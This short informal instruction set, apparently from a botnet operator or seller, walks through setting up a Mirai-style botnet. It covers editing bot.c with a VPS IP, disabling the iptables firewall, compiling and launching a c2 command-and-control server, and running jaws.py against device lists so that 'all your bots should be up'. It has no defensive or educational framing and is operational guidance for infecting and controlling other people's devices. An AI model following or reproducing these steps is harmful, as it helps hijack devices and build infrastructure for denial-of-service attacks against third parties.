edit the bot.c file with server, i already put bot port k8 you just needa put the vps ip in.
yum update -y
yum install httpd; yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
service httpd restart; service iptables stop
sed -i s/1024/9999999/g /usr/include/bits/typesizes.h
gcc c2.c -o c2 -pthread; rm -rf c2.c
python compile.py bot.c theserverip
screen ./c2 999 1 333
k8 if that dont work do sudo screen ./c2 999 1 333
logins are in users
once you have connected and can see the bot number do the following commands
cd jaws
python3 jaws.py
then do jaws1
python3 jaws.py
then do jaws2
python3 jaws.py
then do jaws3 
then all your bots should be up if not ill add some list of not dead bots
